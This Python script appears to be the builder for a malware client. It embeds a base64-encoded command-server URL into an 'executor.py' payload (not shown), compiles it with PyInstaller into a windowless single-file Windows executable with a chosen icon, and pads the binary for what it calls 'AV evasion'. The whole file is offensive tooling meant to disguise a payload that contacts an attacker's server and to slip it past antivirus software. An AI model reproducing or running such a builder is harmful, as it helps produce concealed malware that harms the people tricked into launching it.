from evasion import increasesize
import base64
import os


with open("executor.py", "r") as f:
    build = f.read()
    f.close()

url = input("Server URL: ")
if url.endswith("/"):
    url = url[:-1] + ""

if not url.startswith(("http://", "https://")):
    print("Is your server a HTTP or a HTTPS server? (HTTP/HTTPS): ")
    choice = input().strip().lower()
    if choice == "https":
        print(f"Replacing {url} with https://{url}")
        url = "https://" + url
    elif choice == "http":
        print(f"Replacing {url} with http://{url}")
        url = "http://" + url

build = build.replace("DO_NOT_CHANGE_ME", base64.b64encode(url.encode()).decode())

with open("source.py", "w") as f:
    f.write(build)
    f.close()

name = input("What shall be the name of the executable? ")
use_icon = input("Use default icon? Y/N: ")

if use_icon.lower() == "y":
    os.system('cls')
    os.system(f"""pyinstaller source.py --noconsole --onefile --icon=resources\icon.ico --name="{name}" """)
    print("Appending data for AV evasion.")
    increasesize.append_data(f"dist\{name}.exe")
    os.system('cls')
    print("Your executable is ready. It can be found in the the dist directory.")

else:
    os.system('cls')
    icon = input("Path of the icon.ico to use (relative to this directory): ")
    os.system(f"""pyinstaller source.py --noconsole --onefile --icon={icon} --name="{name}" """)
    print("Appending data for AV evasion.")
    increasesize.append_data(f"dist\{name}.exe")
    os.system(f'del {name}.spec')
    os.system('cls')
    print("Your executable is ready. It can be found in the the dist directory.")
